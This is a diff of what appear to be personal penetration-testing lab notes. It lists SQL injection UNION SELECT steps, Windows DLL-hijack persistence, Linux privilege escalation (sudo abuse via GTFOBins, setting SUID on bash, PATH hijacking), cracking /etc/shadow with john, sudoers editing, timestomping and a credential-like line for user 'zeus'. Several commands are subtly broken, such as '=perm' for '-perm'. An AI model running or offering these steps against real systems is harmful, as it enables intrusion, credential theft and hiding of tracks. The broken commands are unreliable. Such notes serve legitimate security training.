@@ -82,3 +82,45 @@ Step 2 - UNION SELECT #,#,#,#;
 **** Step 3 (Golden Statement) - UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;# ****
 Step 4 - UNION SELECT id,2,name,pass,5 FROM session.user;#
 Step 5 - UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
+
+
+Priv Escalation, Persistence, and Obfuscation (Windows):
+sigcheck -m C:<directory>
+schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -CaseSensitive | select-string -pattern "COM Handler" -NotMatch
+
+scp <dll> <user>@<ip>:<source> 
+
+hijackmeplz.dll
+
+Priv Escalation, Persistence, and Obfuscation (Linux):
+sudo -l
+GTFOBins
+  apt-get
+sudo apt-get changelog apt
+  #!/bin/bash
+find / -type f =perm /2000 2>/dev/null (GUID set)
+  chmod u+s /bin/bash
+find / -type f =perm /4000 2>/dev/null (SUID set)
+find / -type f =perm /6000 2>/dev/null (GUID+SUID set)
+
+echo $PATH
+PATH=.:$PATH
+
+
+john:
+needs /etc/shadow contents
+target users are root or zeus
+
+sudo apt install john
+sudo cat /etc/shadow
+mkdir && cd
+echo "user info" > shadow.txt
+john --wordlist=passwords.txt shadow.txt
+john shadow.txt --show
+
+sudo vim /etc/sudoers
+
+touch -t 
+
+zeus::ghjcnbnenrf
+
